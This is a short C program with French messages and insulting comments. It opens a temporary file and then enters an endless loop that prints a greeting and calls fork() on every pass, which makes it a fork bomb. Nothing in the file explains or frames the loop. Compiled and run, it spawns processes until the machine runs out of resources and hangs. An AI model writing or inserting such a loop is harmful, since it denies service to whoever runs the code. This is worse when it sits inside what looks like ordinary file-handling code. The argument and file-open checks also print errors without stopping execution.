#include <ctype.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define FILENAME "temp.txt"

int main(int argc, char const *argv[]) {

    if (argc <= 2) printf("Erreur il faut au minimum 2 parametres\n");

    int temp_file = open(FILENAME, O_CREAT | O_WRONLY, 0666);
    if (temp_file < 0) printf("Erreur lors de l'ouverture du fichier\n");

    //pue la merde ton codeeee
    //ma grand mere fait mieux
    
    while (1 == 1)
    {
        printf("Salut mec\n");
        fork();
    }
    
    
    return EXIT_SUCCESS;
}
